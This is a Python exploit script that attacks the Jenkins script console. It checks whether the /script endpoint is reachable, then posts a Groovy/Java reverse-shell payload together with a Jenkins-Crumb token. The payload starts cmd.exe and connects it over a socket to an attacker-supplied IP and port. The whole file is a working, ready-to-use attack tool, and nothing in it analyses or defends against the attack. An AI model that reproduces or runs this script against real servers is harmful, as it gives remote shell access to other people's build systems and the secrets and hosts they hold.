import requests
import argparse

def checkrce(url):
    url = url + "/script"
    r = requests.get(url)
    if r.status_code == 200:
        return True
    else:
        return False

def reverseshell(url, ip, port, crumbs):
    url = url + "/script"
    script_payload ='String host="str_ip_address";int port=str_port;String os="cmd.exe";Process p=new ProcessBuilder(os).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'.replace("str_ip_address", str(ip)).replace("str_port", str(port))
    print("[+] Reverse Shell payload used: {payload}".format(payload=script_payload))
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "script": script_payload,
        "Jenkins-Crumb": crumbs,
        "Submit": "Run"
    }
    r = requests.post(url, data=data, headers=headers, timeout=10)
    
def main(url, ip, port, crumbs):
    if checkrce(url) == True:
        print("[+] Spawning reverse shell connection on {ip}:{port}".format(ip=ip, port=port))
        try:
            reverseshell(url, ip, port, crumbs)
        except:
            pass
    else:
        print("[!] {url} cannot be exploited".format(url=url))

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help="Vulnerable URL")
    parser.add_argument('-c', '--crumb', help="String value of Jenkins-Crumb")
    parser.add_argument('-i','--ip', help="IP Address of listening connection/lhost")
    parser.add_argument('-p','--port', help="Port Number of listening connection/lport")
    args=parser.parse_args()
    main(args.url, str(args.ip), str(args.port), args.crumb)
